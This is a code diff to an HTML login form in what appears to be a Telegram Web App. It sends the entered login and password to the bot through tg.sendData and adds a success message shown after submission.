@@ -86,15 +86,18 @@
         <!-- Add navigation here if needed -->
     </div>
 
-    <div class="login-container">
-        <form action="/submit-login" method="post" id="login-form">
+    <div class="login-container" id="login-container">
+        <form id="login-form">
             <label for="login">Логин</label>
             <input type="text" id="login" name="login" required>
             <label for="password">Пароль</label>
             <input type="password" id="password" name="password" required>
             <button id="oformout" type="submit">Войти в систему</button>
-            <!-- Add additional info here if needed -->
         </form>
+    </div>
+
+    <div id="success-message" style="display:none; text-align:center; padding:20px;">
+        <h2>Дані успішно надіслані!</h2>
     </div>
 
     <script>
@@ -113,7 +116,11 @@
                 password: password
             }
 
-            tg.sendData(JSON.stringify(data)); // правильно використовуємо stringify
+            tg.sendData(JSON.stringify(data)); // відправляємо дані
+
+            // Показуємо інше вікно після надсилання даних
+            document.getElementById("login-container").style.display = "none";
+            document.getElementById("success-message").style.display = "block";
         });
     </script>
 
